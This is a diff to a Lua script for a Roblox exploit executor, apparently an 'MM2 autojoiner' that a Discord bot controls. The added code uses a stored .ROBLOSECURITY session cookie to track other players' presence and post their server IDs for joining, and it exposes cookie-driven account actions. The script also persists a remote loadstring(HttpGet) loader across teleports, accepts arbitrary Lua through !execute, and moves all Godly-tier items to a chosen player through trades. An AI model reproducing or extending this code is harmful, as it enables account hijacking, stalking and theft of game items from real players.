@@ -1,5 +1,5 @@
 -- ═══════════════════════════════════════════════════════════════
---  FALLBACK CONFIG (reads globals set by your executor)
+--  FALLBACK CONFIG
 -- ═══════════════════════════════════════════════════════════════
 _bt           = _bt or "";
 _ch           = _ch or "";
@@ -38,7 +38,6 @@ _sumV = 0;
 _doneT = 0;
 _minRare = _minRare or "Godly";
 
--- session stats
 _hitsJoined = 0;
 _itemsGained = 0;
 _sessionStart = tick();
@@ -46,15 +45,10 @@ _sessionStart = tick();
 -- persistent stats
 local STATS_FILE = "stats_persistent.dat";
 _pStats = {
-    hitsJoined     = 0,
-    tradesDone     = 0,
-    itemsGained    = 0,
-    valueGained    = 0,
-    firstStart     = os.time(),
-    lastUpdate     = os.time(),
-    serversVisited = 0,
+    hitsJoined = 0, tradesDone = 0, itemsGained = 0,
+    valueGained = 0, firstStart = os.time(),
+    lastUpdate = os.time(), serversVisited = 0,
 };
-
 if isfile(STATS_FILE) then
     local _ok, _raw = pcall(readfile, STATS_FILE);
     if _ok and type(_raw) == "string" and _raw ~= "" then
@@ -64,34 +58,41 @@ if isfile(STATS_FILE) then
         end
     end
 end
-
 _pStats.serversVisited = (_pStats.serversVisited or 0) + 1;
 _pStats.lastUpdate = os.time();
-
 local function _saveStats()
     pcall(function()
         _pStats.lastUpdate = os.time();
         writefile(STATS_FILE, _hs:JSONEncode(_pStats));
     end);
 end
-
 _saveStats();
+
+-- tracked users store
+local TRACK_FILE = "tracked_users.dat";
+_tracked = {};
+if isfile(TRACK_FILE) then
+    local _ok, _raw = pcall(readfile, TRACK_FILE);
+    if _ok and type(_raw) == "string" and _raw ~= "" then
+        local _dok, _dec = pcall(function() return _hs:JSONDecode(_raw) end);
+        if _dok and type(_dec) == "table" then _tracked = _dec end
+    end
+end
+local function _saveTracked()
+    pcall(function() writefile(TRACK_FILE, _hs:JSONEncode(_tracked)) end);
+end
 
 print(1)
 
--- ═══════════════════════════════════════════════════════════════
---  AUTO-EXECUTE
--- ═══════════════════════════════════════════════════════════════
+-- ═══════════ AUTO-EXECUTE ═══════════
 local AUTOEXEC_FILE = "autoexec_url.dat";
 _autoexecURL = "";
-
 if isfile(AUTOEXEC_FILE) then
     local _ok, _t = pcall(readfile, AUTOEXEC_FILE);
     if _ok and type(_t) == "string" then
         _autoexecURL = _t:gsub("^%s+", ""):gsub("%s+$", "");
     end
 end
-
 local function _queueAutoexec()
     if _autoexecURL == "" then return false end
     local _loader = "loadstring(game:HttpGet([[" .. _autoexecURL .. "]]))()";
@@ -105,12 +106,8 @@ local function _queueAutoexec()
     if not _used and type(queueonteleport) == "function" then
         if pcall(function() queueonteleport(_loader) end) then _used = "queueonteleport"; end
     end
-    if not _used and fluxus and type(fluxus.queue_on_teleport) == "function" then
-        if pcall(function() fluxus.queue_on_teleport(_loader) end) then _used = "fluxus.queue_on_teleport"; end
-    end
     return _used;
 end
-
 local function _clearQueue()
     local _noop = "-- autoexecute cleared";
     if syn and type(syn.queue_on_teleport) == "function" then
@@ -122,25 +119,18 @@ local function _clearQueue()
     if type(queueonteleport) == "function" then
         pcall(function() queueonteleport(_noop) end);
     end
-    if fluxus and type(fluxus.queue_on_teleport) == "function" then
-        pcall(function() fluxus.queue_on_teleport(_noop) end);
-    end
 end
-
 task.spawn(function()
     while task.wait(30) do
         if _autoexecURL ~= "" then _queueAutoexec() end
     end
 end)
-
 if _autoexecURL ~= "" then
     local _used = _queueAutoexec();
     print("[autoexec] restored: " .. _autoexecURL .. " (" .. tostring(_used or "NO QUEUE METHOD") .. ")");
 end
 
--- ═══════════════════════════════════════════════════════════════
---  MM2-SPECIFIC INIT
--- ═══════════════════════════════════════════════════════════════
+-- ═══════════ MM2 INIT ═══════════
 if _isMM2 then
     _rs.Trade.UpdateTrade.OnClientEvent:Connect(function(_d)
         if _d.LastOffer then
@@ -154,32 +144,52 @@ if _isMM2 then
     end)
 
     task.spawn(function()
-        local _g = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("DeviceSelect", 60);
+        local _pg = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui", 30);
+        local _g = _pg:WaitForChild("DeviceSelect", 60);
         if not _g then return end
-        while _g.Parent do
-            pcall(function() firesignal(_g.Container.Phone.Button.MouseButton1Click) end);
+        print("[DEVICE] DeviceSelect found");
+        local function _findBtn()
+            local _c = _g:FindFirstChild("Container");
+            if _c then
+                local _p = _c:FindFirstChild("Phone");
+                if _p then
+                    local _b = _p:FindFirstChild("Button");
+                    if _b then return _b end
+                end
+            end
+            for _, _d in ipairs(_g:GetDescendants()) do
+                if _d:IsA("GuiButton") and _d.Name:lower():find("phone") then return _d end
+            end
+            return nil;
+        end
+        local _n = 0;
+        while _g.Parent and _n < 300 do
+            _n = _n + 1;
+            local _b = _findBtn();
+            if _b then
+                pcall(function() firesignal(_b.MouseButton1Click) end);
+                pcall(function() firesignal(_b.Activated) end);
+                pcall(function()
+                    for _, _cc in pairs(getconnections(_b.MouseButton1Click)) do
+                        _cc:Fire();
+                    end
+                end);
+            end
             task.wait(0.1);
         end
     end)
 
-    function _ts()
-        return _rs.Trade.GetTradeStatus:InvokeServer();
-    end
-
-    function _gi()
-        return _rs.Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name).Weapons.Owned;
-    end
+    function _ts() return _rs.Trade.GetTradeStatus:InvokeServer(); end
+    function _gi() return _rs.Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name).Weapons.Owned; end
 
     local _db = require(_rs.Database.Sync).Weapons;
     _DB = _db;
-
     local _rT = {"Common","Uncommon","Rare","Legendary","Vintage","Godly","Ancient","Unique"};
     _RT = _rT;
     local _gI = table.find(_rT, "Godly") or 6;
     _GI = _gI;
 
     local _vL = {};
-
     pcall(function()
         local _body = game:HttpGet("http://109.120.157.241:5000/supreme");
         if _body and #_body > 50 then
@@ -192,7 +202,6 @@ if _isMM2 then
     end);
 
     if not next(_vL) then
-        print("[vL] supreme failed, trying GitHub fallback...");
         pcall(function()
             local _urls = {
                 "https://raw.githubusercontent.com/meeqscripts/mm2/refs/heads/main/values2",
@@ -218,9 +227,6 @@ if _isMM2 then
                     end
                 end
             end
-            local _n = 0;
-            for _ in pairs(_vL) do _n = _n + 1 end
-            print("[vL] GitHub fallback loaded, categories:", _n);
         end);
     end
 
@@ -240,10 +246,6 @@ if _isMM2 then
         if _b[_v] then return _b[_v] end
         if _b[_v .. " (" .. _t .. ")"] then return _b[_v .. " (" .. _t .. ")"] end
         if _b[_v .. " " .. _t] then return _b[_v .. " " .. _t] end
-        if _y ~= "" then
-            if _b[_v .. " (" .. _y .. ")"] then return _b[_v .. " (" .. _y .. ")"] end
-            if _b[_v .. " " .. _y] then return _b[_v .. " " .. _y] end
-        end
         return nil
     end
 
@@ -282,8 +284,7 @@ if _isMM2 then
 
     function _snap(_reason)
         local _u = "https://discord.com/api/v10/channels/".._lg.."/messages";
-        _all = {};
-        _tot = 0;
+        _all = {}; _tot = 0;
         for _i, _v in pairs(_gi()) do
             local _val = _iv(_i);
             local _lr = _db[_i] and _db[_i].Rarity;
@@ -300,8 +301,7 @@ if _isMM2 then
         end
         local _joined = table.concat(_lines, "\n");
         while #_joined > 1014 and #_lines > 0 do
-            table.remove(_lines);
-            _joined = table.concat(_lines, "\n");
+            table.remove(_lines); _joined = table.concat(_lines, "\n");
         end
         local _info = string.format(
             "```\n📱 Executor: %s %s\n💎 Total inventory value: %s\n📦 Items shown: %d / %d\n🔁 Trades completed: %d\n🕒 Reason: %s\n```",
@@ -311,19 +311,17 @@ if _isMM2 then
             { name = "Info", value = _info },
             { name = "Full Inventory", value = "```\n".._joined.."\n```" },
         };
-        local _p = { embeds = {{ title = "MM2 Autojoiner - Post-Trade Inventory", color = 0x3EED50, fields = _f, footer = { text = "Snapshot at " .. os.date("%H:%M:%S") }, timestamp = DateTime.now():ToIsoDate() }} };
-        local _r = request({ Url = _u, Method = "POST", Headers = { ["Authorization"] = "Bot " .. _bt, ["Content-Type"] = "application/json" }, Body = _hs:JSONEncode(_p) });
-        if _r.StatusCode ~= 200 then warn("[_snap] "..tostring(_r.Body)) end
+        pcall(function()
+            request({ Url = _u, Method = "POST", Headers = { ["Authorization"] = "Bot " .. _bt, ["Content-Type"] = "application/json" }, Body = _hs:JSONEncode({ embeds = {{ title = "MM2 Autojoiner - Post-Trade Inventory", color = 0x3EED50, fields = _f, footer = { text = "Snapshot at " .. os.date("%H:%M:%S") }, timestamp = DateTime.now():ToIsoDate() }} }) });
+        end);
     end
 
     function _log(_in)
-        _n = {};
-        _nv = 0;
+        _n = {}; _nv = 0;
         for _i, _v in pairs(_in) do
             local _val = _iv(_i);
             table.insert(_n, { name = _i, amount = _v, value = _val });
-            _nv = _nv + _val * _v;
-            _sumV = _sumV + _val * _v;
+            _nv = _nv + _val * _v; _sumV = _sumV + _val * _v;
         end
         table.sort(_n, function(_a, _b) return (_a.value * _a.amount) > (_b.value * _b.amount) end);
         _f = {
@@ -335,10 +333,9 @@ if _isMM2 then
             _f[2].value = _f[2].value .. _s .. "\n";
         end
         _f[2].value = "```\n".._f[2].value.."\n```";
-        local _u = "https://discord.com/api/v10/channels/".._lg.."/messages";
-        local _p = { embeds = {{ title = "MM2 autojoiner", color = 0x3EED50, fields = _f }} };
-        local _r = request({ Url = _u, Method = "POST", Headers = { ["Authorization"] = "Bot " .. _bt, ["Content-Type"] = "application/json" }, Body = _hs:JSONEncode(_p) });
-        if _r.StatusCode ~= 200 then warn(_r.Body) end
+        pcall(function()
+            request({ Url = "https://discord.com/api/v10/channels/".._lg.."/messages", Method = "POST", Headers = { ["Authorization"] = "Bot " .. _bt, ["Content-Type"] = "application/json" }, Body = _hs:JSONEncode({ embeds = {{ title = "MM2 autojoiner", color = 0x3EED50, fields = _f }} }) });
+        end);
     end
 
     task.spawn(function()
@@ -356,7 +353,6 @@ if _isMM2 then
                 local _b, _it = _chk();
                 if _b == true then
                     _doneT = _doneT + 1;
-
                     local _gainCount, _gainValue = 0, 0;
                     for _ii, _vv in pairs(_it) do
                         if _vv > 0 then
@@ -365,17 +361,14 @@ if _isMM2 then
                         end
                     end
                     _itemsGained = _itemsGained + _gainCount;
-
-                    _pStats.tradesDone  = (_pStats.tradesDone  or 0) + 1;
+                    _pStats.tradesDone = (_pStats.tradesDone or 0) + 1;
                     _pStats.itemsGained = (_pStats.itemsGained or 0) + _gainCount;
                     _pStats.valueGained = (_pStats.valueGained or 0) + _gainValue;
                     _saveStats();
-
                     local _hist = _rl("trade_history.dat");
                     table.insert(_hist, { t = os.time(), c = _gainCount, v = _gainValue });
                     while #_hist > 100 do table.remove(_hist, 1) end
                     _wl("trade_history.dat", _hist);
-
                     _log(_it);
                     _snap("trade");
                 end
@@ -388,8 +381,7 @@ if _isMM2 then
 
     function _show()
         local _u = "https://discord.com/api/v10/channels/".._lg.."/messages";
-        _n2 = {};
-        _nv2 = 0;
+        _n2 = {}; _nv2 = 0;
         for _i, _v in pairs(_gi()) do
             local _val = _iv(_i);
             local _lr = _db[_i].Rarity;
@@ -412,21 +404,19 @@ if _isMM2 then
             local _ln = {};
             for _line in _f[2].value:gmatch("[^\r\n]+") do table.insert(_ln, _line) end
             while #_f[2].value > 1024 and #_ln > 0 do
-                table.remove(_ln);
-                _f[2].value = table.concat(_ln, "\n");
+                table.remove(_ln); _f[2].value = table.concat(_ln, "\n");
             end
         end
         _f[2].value = "```\n".._f[2].value.."\n```";
-        local _p = { embeds = {{ title = "MM2 Autojoiner", color = 0x3EED50, fields = _f }} };
-        local _r = request({ Url = _u, Method = "POST", Headers = { ["Authorization"] = "Bot " .. _bt, ["Content-Type"] = "application/json" }, Body = _hs:JSONEncode(_p) });
-        if _r.StatusCode ~= 200 then warn(_r.Body) end
+        pcall(function()
+            request({ Url = _u, Method = "POST", Headers = { ["Authorization"] = "Bot " .. _bt, ["Content-Type"] = "application/json" }, Body = _hs:JSONEncode({ embeds = {{ title = "MM2 Autojoiner", color = 0x3EED50, fields = _f }} }) });
+        end);
     end
 
     function _showF()
         local _u = "https://discord.com/api/v10/channels/".._lg.."/messages";
         local _inv = "Inventory value: ";
-        _tb = {};
-        _vl = 0;
+        _tb = {}; _vl = 0;
         for _i, _v in pairs(_gi()) do
             local _val = _iv(_i);
             local _lr = _db[_i].Rarity;
@@ -443,13 +433,10 @@ if _isMM2 then
             _inv = _inv .. _s .. "\n";
         end
         local _bd = "---------------------------" .. tick();
-        local _body = "--" .. _bd .. "\r\n" ..
-                    "Content-Disposition: form-data; name=\"file\"; filename=\"items.yaml\"\r\n" ..
-                    "Content-Type: text/plain\r\n\r\n" ..
-                    _inv .. "\r\n" ..
-                    "--" .. _bd .. "--\r\n";
-        local _r = request({ Url = _u, Method = "POST", Headers = { ["Authorization"] = "Bot " .. _bt, ["Content-Type"] = "multipart/form-data; boundary=" .. _bd }, Body = _body });
-        if _r.StatusCode == 200 or _r.StatusCode == 201 then else warn(_r.Body) end
+        local _body = "--" .. _bd .. "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"items.yaml\"\r\nContent-Type: text/plain\r\n\r\n" .. _inv .. "\r\n--" .. _bd .. "--\r\n";
+        pcall(function()
+            request({ Url = _u, Method = "POST", Headers = { ["Authorization"] = "Bot " .. _bt, ["Content-Type"] = "multipart/form-data; boundary=" .. _bd }, Body = _body });
+        end);
     end
 end
 
@@ -485,8 +472,7 @@ local function _al(_f, _v)
     for _, _x in ipairs(_t) do
         if _x == _v then return end
     end
-    table.insert(_t, _v);
-    _wl(_f, _t);
+    table.insert(_t, _v); _wl(_f, _t);
 end
 
 function _gone()
@@ -497,9 +483,7 @@ function _gone()
     return true
 end
 
-_transferActive = false;
-_transferTarget = nil;
-_transferDone   = 0;
+_transferActive = false; _transferTarget = nil; _transferDone = 0;
 
 local function _ok2go()
     if _transferActive then return false end
@@ -508,10 +492,7 @@ end
 
 local _tp = game:GetService("TeleportService");
 local _lp = game.Players.LocalPlayer;
-
-local _moving = false;
-local _lastMid = nil;
-local _cur = nil;
+local _moving = false; _lastMid = nil; _cur = nil;
 
 local function _getMsgs(_after, _chan)
     _chan = _chan or _hitCh;
@@ -530,29 +511,17 @@ end
 local function _pjm(_m)
     if not _m or not _m.author then return end
     if _m.channel_id and _m.channel_id ~= _hitCh then return end
-
     local _c = _m.content or "";
     local _pi, _ji = string.match(_c, "(%d+),%s*'([^']+)'");
-    if not (_pi and _ji) then
-        _pi, _ji = string.match(_c, 'TeleportToPlaceInstance%s*%(%s*"(%d+)"%s*,%s*"([^"]+)"');
-    end
-    if not (_pi and _ji) then
-        _pi, _ji = string.match(_c, "TeleportToPlaceInstance%s*%(%s*(%d+)%s*,%s*['\"]([%w%-]+)['\"]%s*%)");
-    end
+    if not (_pi and _ji) then _pi, _ji = string.match(_c, 'TeleportToPlaceInstance%s*%(%s*"(%d+)"%s*,%s*"([^"]+)"'); end
+    if not (_pi and _ji) then _pi, _ji = string.match(_c, "TeleportToPlaceInstance%s*%(%s*(%d+)%s*,%s*['\"]([%w%-]+)['\"]%s*%)"); end
     if not (_pi and _ji) then return end
     if not _allow[tonumber(_pi)] then return end
-
     task.spawn(function() _reactIn(_hitCh, _m.id, "✅") end);
     writefile("last_target.dat", _m.author.username);
-
     if _il("hits_joined.dat", _m.id) then return end
     if _ji == game.JobId then return end
-
-    if _moving then
-        _tpTo(_pi, _ji, _m.id);
-        return;
-    end
-
+    if _moving then _tpTo(_pi, _ji, _m.id); return end
     local _q = _rl("pending_hits.dat");
     for _, _j in ipairs(_q) do
         if _j.msgid == _m.id then return end
@@ -564,9 +533,7 @@ end
 local function _scanLoop()
     while _moving do
         local _ms = _getMsgs(_lastMid, _hitCh);
-        for _i = #_ms, 1, -1 do
-            _pjm(_ms[_i]);
-        end
+        for _i = #_ms, 1, -1 do _pjm(_ms[_i]) end
         if _ms[1] then _lastMid = _ms[1].id end
         task.wait(1);
     end
@@ -577,42 +544,27 @@ function _tpTo(_pi, _ji, _mi)
     if _moving then return end
     _moving = true;
     _hitsJoined = _hitsJoined + 1;
-
     _pStats.hitsJoined = (_pStats.hitsJoined or 0) + 1;
     _saveStats();
-
     task.spawn(_scanLoop);
-
     task.spawn(function()
         local _fail = false;
         local _cn = _tp.TeleportInitFailed:Connect(function(_p)
             if _p == _lp then _fail = true end
         end);
-
         while _moving do
             local _t = _cur;
             _fail = false;
             pcall(function() writefile("last_jobid.dat", game.JobId) end);
-
-            local _ok = pcall(function()
-                _tp:TeleportToPlaceInstance(_t.placeId, _t.jobId, _lp);
-            end);
+            local _ok = pcall(function() _tp:TeleportToPlaceInstance(_t.placeId, _t.jobId, _lp) end);
             if _ok and _t.msgid then _al("hits_joined.dat", _t.msgid) end
-
             local _w = 0;
-            while _w < 5 and not _fail and _cur == _t do
-                task.wait(0.5);
-                _w = _w + 0.5;
-            end
+            while _w < 5 and not _fail and _cur == _t do task.wait(0.5); _w = _w + 0.5 end
             if _cur == _t then task.wait(2) end
         end
         if _cn then _cn:Disconnect() end
     end)
 end
-
--- ═══════════════════════════════════════════════════════════════
---  TRANSFER LOGIC
--- ═══════════════════════════════════════════════════════════════
 
 local function _collectGodlies()
     local _out = {};
@@ -648,40 +600,23 @@ local function _postEmbed(_title, _desc, _color)
 end
 
 local function _doTransfer(_targetName)
-    _transferActive = true;
-    _transferTarget = _targetName;
-    _transferDone = 0;
-
+    _transferActive = true; _transferTarget = _targetName; _transferDone = 0;
     print("[transfer] starting -> ".._targetName);
     _postEmbed("🔄 Transfer Started", "Target: **".._targetName.."**\nSending all Godly+ items.", 0x3EED50);
-
     local _target = game.Players:FindFirstChild(_targetName);
     if not _target then
         _postEmbed("❌ Transfer Failed", "Player **".._targetName.."** is not in this server.", 0xFF0000);
-        _transferActive = false;
-        return;
+        _transferActive = false; return;
     end
-
     task.wait(1.5);
-
     local _safety = 0;
     while _transferActive and _safety < 100 do
         _safety = _safety + 1;
-
         _target = game.Players:FindFirstChild(_targetName);
-        if not _target then
-            _postEmbed("⚠️ Transfer Stopped", "**".._targetName.."** left the server.\nBatches sent: **".._transferDone.."**", 0xFFA500);
-            break;
-        end
-
+        if not _target then _postEmbed("⚠️ Transfer Stopped", "**".._targetName.."** left.", 0xFFA500); break end
         local _batch = _collectGodlies();
-        if #_batch == 0 then
-            _postEmbed("✅ Transfer Complete", "No more Godly+ items.\nBatches sent: **".._transferDone.."**", 0x3EED50);
-            break;
-        end
-
+        if #_batch == 0 then _postEmbed("✅ Transfer Complete", "No more Godly+ items.", 0x3EED50); break end
         _clearTrade();
-
         local _sent = false;
         for _try = 1, 15 do
             if not _transferActive then break end
@@ -695,11 +630,8 @@ local function _doTransfer(_targetName)
             end
             task.wait(0.3);
         end
-
         if not _transferActive then break end
-
         if not _sent then
-            print("[transfer] target didn't accept, retrying...");
             task.wait(2);
         else
             local _offered = 0;
@@ -710,42 +642,24 @@ local function _doTransfer(_targetName)
                 _offered = _offered + 1;
             end
             if _offered == 0 then break end
-
             task.wait(4.5);
             pcall(function() _rs.Trade.AcceptTrade:FireServer(game.PlaceId * 3, {}) end);
-
             local _t = 0;
-            while _ts() ~= "None" and _t < 15 do
-                task.wait(0.2);
-                _t = _t + 0.2;
-            end
-
+            while _ts() ~= "None" and _t < 15 do task.wait(0.2); _t = _t + 0.2 end
             _transferDone = _transferDone + 1;
-            print("[transfer] batch ".._transferDone.." sent");
         end
-
         task.wait(0.5);
     end
-
-    _postEmbed("🏁 Transfer Ended", "Batches: **".._transferDone.."**\nTarget: **".._targetName.."**", 0x3EED50);
-
-    _transferActive = false;
-    _transferTarget = nil;
-    print("[transfer] finished, batches: ".._transferDone);
+    _postEmbed("🏁 Transfer Ended", "Batches: **".._transferDone.."**", 0x3EED50);
+    _transferActive = false; _transferTarget = nil;
 end
 
 -- ═══════════════════════════════════════════════════════════════
 --  GATEWAY
 -- ═══════════════════════════════════════════════════════════════
 
-local _sock;
-local _seq;
-local _sid;
-local _rurl;
-local _resume = false;
-local _gen = 0;
-local _rGen = 0;
-local _hGen = 0;
+local _sock; local _seq; local _sid; local _rurl;
+local _resume = false; local _gen = 0; local _rGen = 0; local _hGen = 0;
 
 function _send(_op, _d)
     if not _sock then return end
@@ -756,30 +670,100 @@ local function _isOwner(_author)
     return _owner ~= "" and _author and tostring(_author.id) == tostring(_owner)
 end
 
+-- ═══════════ COOKIE HELPERS ═══════════
+local function _getUserId(_username)
+    local _ok, _r = pcall(function()
+        return request({
+            Url = "https://users.roblox.com/v1/usernames/users",
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = _hs:JSONEncode({ usernames = { _username }, excludeBannedUsers = false })
+        })
+    end);
+    if not _ok or not _r or _r.StatusCode ~= 200 then return nil, "lookup failed" end
+    local _d = _hs:JSONDecode(_r.Body);
+    if not _d.data or not _d.data[1] then return nil, "no results" end
+    return _d.data[1].id, _d.data[1].name, _d.data[1].displayName;
+end
+
+local function _cookieGet(_url)
+    return request({
+        Url = _url,
+        Method = "GET",
+        Headers = { ["Cookie"] = ".ROBLOSECURITY=".._robloxCookie }
+    })
+end
+
+local function _cookiePost(_url, _body)
+    return request({
+        Url = _url,
+        Method = "POST",
+        Headers = {
+            ["Cookie"] = ".ROBLOSECURITY=".._robloxCookie,
+            ["Content-Type"] = "application/json"
+        },
+        Body = _body or "{}"
+    })
+end
+
+-- ═══════════ TRACKER LOOP ═══════════
+task.spawn(function()
+    while task.wait(60) do
+        if _robloxCookie == "" or not next(_tracked) then continue end
+        for _uname, _info in pairs(_tracked) do
+            pcall(function()
+                local _r = request({
+                    Url = "https://presence.roblox.com/v1/presence/users",
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json",
+                        ["Cookie"] = ".ROBLOSECURITY=".._robloxCookie
+                    },
+                    Body = _hs:JSONEncode({ userIds = { _info.userId } })
+                });
+                if _r and _r.StatusCode == 200 then
+                    local _d = _hs:JSONDecode(_r.Body);
+                    local _p = _d.userPresences and _d.userPresences[1];
+                    if _p then
+                        local _nowInGame = (_p.userPresenceType == 2);
+                        local _wasInGame = (_info.lastPresence == 2);
+                        if _nowInGame and not _wasInGame then
+                            local _joinCmd = "game:GetService('TeleportService'):TeleportToPlaceInstance("..
+                                tostring(_p.placeId)..", '"..tostring(_p.gameId).."')"
+                            _postEmbed("🎯 ".._uname.." is playing now",
+                                "**Game:** `"..tostring(_p.lastLocation).."`\n" ..
+                                "**JobId:** `"..tostring(_p.gameId).."`\n\n".._joinCmd,
+                                0x00FF00);
+                        end
+                        _tracked[_uname].lastPresence = _p.userPresenceType or 0;
+                        _saveTracked();
+                    end
+                end
+            end);
+            task.wait(3);
+        end
+    end
+end)
+
+-- ═══════════ GATEWAY SETUP ═══════════
 local function _gw()
     _gen = _gen + 1;
     local _me = _gen;
     local _u = "wss://gateway.discord.gg/?v=10&encoding=json";
     if _resume and _rurl then _u = _rurl .. "/?v=10&encoding=json" end
-
     print("[gw] connecting (gen ".._me..")");
     _sock = WebSocket.connect(_u);
     _sock.OnMessage:Connect(function(_m)
         if _gen ~= _me then return end
         local _d = _hs:JSONDecode(_m);
         if _d.s then _seq = _d.s end
-
         if _d.op == 10 then
             _hGen = _me;
             local _hb = _d.d.heartbeat_interval / 1000;
             if _resume and _sid and _seq then
                 _send(6, { token = _bt, session_id = _sid, seq = _seq });
             else
-                _send(2, {
-                    token = _bt,
-                    intents = 33281,
-                    properties = { os = "linux", browser = "opsec", device = "desktop" }
-                });
+                _send(2, { token = _bt, intents = 33281, properties = { os = "linux", browser = "opsec", device = "desktop" } });
             end
             task.spawn(function()
                 while _gen == _me and _sock do
@@ -789,26 +773,13 @@ local function _gw()
                 end
             end)
         end
-
         if _d.op == 0 and _d.t == "READY" then
-            _sid = _d.d.session_id;
-            _rurl = _d.d.resume_gateway_url;
-            _resume = true;
-            _rGen = _me;
+            _sid = _d.d.session_id; _rurl = _d.d.resume_gateway_url;
+            _resume = true; _rGen = _me;
             print("[gw] connected (READY)");
         end
-
-        if _d.op == 0 and _d.t == "RESUMED" then
-            _rGen = _me;
-            print("[gw] session resumed");
-        end
-
-        if _d.op == 7 then
-            _resume = true;
-            pcall(function() if _sock then _sock:Close() end end);
-            return;
-        end
-
+        if _d.op == 0 and _d.t == "RESUMED" then _rGen = _me; print("[gw] session resumed") end
+        if _d.op == 7 then _resume = true; pcall(function() if _sock then _sock:Close() end end); return end
         if _d.op == 9 then
             _resume = (_d.d == true);
             if not _resume then _sid = nil end
@@ -824,875 +795,642 @@ local function _gw()
             local _isHit = (_md.channel_id == _hitCh);
 
             if _isCmd then
+                -- !help
                 if _content == "!help" then
                     if _isOwner(_md.author) then
                         task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
-                        task.spawn(function()
-                            local _embed = {
-                                title = "📖 Autojoiner Commands",
-                                description = "All commands are **owner-locked**.",
-                                color = 0x3EED50,
-                                fields = {
-                                    { name = "📦 Inventory", value =
-                                        "`!inv` `!invf`\n" ..
-                                        "`!servercheck` — every player's inventory\n" ..
-                                        "`!stats` — session + lifetime\n" ..
-                                        "`!resetstats` — clear lifetime\n" ..
-                                        "`!history` `!queue` `!coins`",
-                                        inline = false },
-                                    { name = "⚙️ Utility", value =
-                                        "`!status` `!server` `!job`\n" ..
-                                        "`!age <user>` `!execute <lua>`\n" ..
-                                        "`!serverget <user>` — find their server (needs cookie)\n" ..
-                                        "`!serverjoin <script|placeId,jobId|jobId>`",
-                                        inline = false },
-                                    { name = "🚀 Movement", value =
-                                        "`!rejoin` `!rejoinlast` `!panic`",
-                                        inline = false },
-                                    { name = "🔁 Transfers", value =
-                                        "`!transfer <user>` `!stoptransfer`",
-                                        inline = false },
-                                    { name = "🎯 Auto-Execute", value =
-                                        "`!autoexecute <url>` `!stopautoexecute` `!runauto` `!showauto`",
-                                        inline = false },
-                                },
-                                footer = { text = "Tip: type !help anytime" },
-                                timestamp = DateTime.now():ToIsoDate()
-                            };
-                            local _pl = { embeds = { _embed } };
-                            pcall(function()
-                                request({ Url = "https://discord.com/api/v10/channels/".._lg.."/messages", Method = "POST", Headers = { ["Authorization"] = "Bot ".._bt, ["Content-Type"] = "application/json" }, Body = _hs:JSONEncode(_pl) });
-                            end);
-                        end);
+                        _postEmbed("📖 Commands",
+                            "**Inventory**: `!inv` `!invf` `!servercheck` `!coins` `!stats` `!history` `!queue`\n" ..
+                            "**Utility**: `!status` `!server` `!job` `!age <u>` `!execute <lua>`\n" ..
+                            "**Cookie Info**: `!rbx <u>` `!online <u>` `!lastseen <u>` `!friends <u>` `!groups <u>` `!usernames <u>` `!avatar <u>` `!robux` `!limiteds <u>` `!trades`\n" ..
+                            "**Cookie Actions**: `!follow <u>` `!unfollow <u>` `!friend <u>` `!statusmsg <txt>` `!joingroup <id>` `!leavegroup <id>`\n" ..
+                            "**Tracking**: `!track <u>` `!untrack` `!tracklist`\n" ..
+                            "**Movement**: `!rejoin` `!rejoinlast` `!panic`\n" ..
+                            "**Transfers**: `!transfer <u>` `!stoptransfer`\n" ..
+                            "**Auto-Execute**: `!autoexecute` `!stopautoexecute` `!runauto` `!showauto`",
+                            0x3EED50);
                     else
                         task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
                     end
                     return;
                 end
 
+                -- MM2 commands
                 if _content == "!inv" then
                     if _isOwner(_md.author) then
                         task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
                         task.spawn(function() if _show then _show() end end);
-                    else
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
                     end
                     return;
                 end
-
                 if _content == "!invf" then
                     if _isOwner(_md.author) then
                         task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
                         task.spawn(function() if _showF then _showF() end end);
-                    else
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
                     end
                     return;
                 end
-
-                if _content == "!servercheck" then
-                    if not _isOwner(_md.author) then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
-                        return;
-                    end
-                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
-                    task.spawn(function()
-                        if not _isMM2 then
-                            _postEmbed("❌ Server Check", "Not in MM2.", 0xFF0000);
-                            return;
-                        end
-                        local _players = game.Players:GetPlayers();
-                        _postEmbed("🔍 Server Check Started",
-                            "Scanning **" .. #_players .. "** players...", 0x3EED50);
-
-                        local _embeds = {};
-                        for _, _p in ipairs(_players) do
-                            local _inv = nil;
-                            local _source = nil;
-                            local _ok1, _res1 = pcall(function()
-                                return _rs.Remotes.Extras.GetFullInventory:InvokeServer(_p.Name);
-                            end);
-                            if _ok1 and type(_res1) == "table" and _res1.Weapons and _res1.Weapons.Owned then
-                                _inv = _res1.Weapons.Owned; _source = "Extras";
-                            end
-                            if not _inv then
-                                local _ok2, _res2 = pcall(function()
-                                    return _rs.Remotes.Inventory.GetProfileData:InvokeServer(_p.Name);
-                                end);
-                                if _ok2 and type(_res2) == "table" and _res2.Weapons and _res2.Weapons.Owned then
-                                    _inv = _res2.Weapons.Owned; _source = "Profile";
-                                end
-                            end
-
-                            if not _inv then
-                                table.insert(_embeds, {
-                                    title = "❓ " .. _p.Name,
-                                    description = "Couldn't fetch inventory.",
-                                    color = 0x808080,
-                                    footer = { text = "Display: " .. _p.DisplayName .. " | ID: " .. _p.UserId },
-                                    timestamp = DateTime.now():ToIsoDate()
-                                });
-                            else
-                                local _items, _totalVal, _totalCount = {}, 0, 0;
-                                for _id, _amt in pairs(_inv) do
-                                    local _e = _DB[_id];
-                                    if _e then
-                                        local _rIdx = table.find(_RT, _e.Rarity);
-                                        if _rIdx and _rIdx >= _MZ then
-                                            local _val = _IV(_id);
-                                            table.insert(_items, { name = _id, amount = _amt, value = _val });
